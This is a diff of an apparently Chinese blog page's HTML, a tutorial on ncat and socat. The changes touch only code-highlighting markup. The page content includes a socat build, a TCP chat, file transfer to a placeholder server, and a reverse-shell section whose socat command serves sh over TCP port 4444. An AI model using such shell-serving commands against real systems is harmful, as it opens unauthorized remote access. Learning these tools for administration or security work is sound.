@@ -48,12 +48,12 @@ Ncat: Version 7.50 ( https://nmap.org/ncat )
 Ncat: Connected to 172.17.0.1:1788.
 Ncat: 9 bytes sent, 0 bytes received in 0.01 seconds.
 root@504d96ae69cc:/docker_files# 
-</code></pre><h3 id=参数列表中文>参数列表(中文)</h3><p><a href=/tools/ncat.txt>ncat参数</a></p><h2 id=0x01-socat>0x01 socat</h2><h3 id=安装>安装</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>wget http://www.dest-unreach.org/socat/download/socat-2.0.0-b9.tar.gz
-</span></span><span style=display:flex><span>tar xvf socat-2.0.0-b9.tar.gz
-</span></span><span style=display:flex><span>cd socat-2.0.0-b9
-</span></span><span style=display:flex><span>./configure
-</span></span><span style=display:flex><span>make
-</span></span><span style=display:flex><span>make install
+</code></pre><h3 id=参数列表中文>参数列表(中文)</h3><p><a href=/tools/ncat.txt>ncat参数</a></p><h2 id=0x01-socat>0x01 socat</h2><h3 id=安装>安装</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://www.dest-unreach.org/socat/download/socat-2.0.0-b9.tar.gz
+</span></span><span class=line><span class=cl>tar xvf socat-2.0.0-b9.tar.gz
+</span></span><span class=line><span class=cl><span class=nb>cd</span> socat-2.0.0-b9
+</span></span><span class=line><span class=cl>./configure
+</span></span><span class=line><span class=cl>make
+</span></span><span class=line><span class=cl>make install
 </span></span></code></pre></div><h3 id=建立通信聊天室>建立通信(聊天室)</h3><p>| 服务端 | <code>socat - tcp4-listen:4444</code>
 | 客户端 | <code>socat tcp:SERVER_IP:4444</code></p><h3 id=传输文件-1>传输文件</h3><p>| 服务端 | <code>socat tcp4-listen:4444 open:data.txt,creat,append</code> |
 | 客户端 | <code>cat test.txt | socat - tcp:SERVER_IP:4444</code> |</p><blockquote><p>传输二进制文件需要将append改成binary</p></blockquote><h3 id=反弹shell-1>反弹Shell</h3><p>| 服务端 | <code>socat tcp-l:4444 exec:sh,pty,stderr</code>
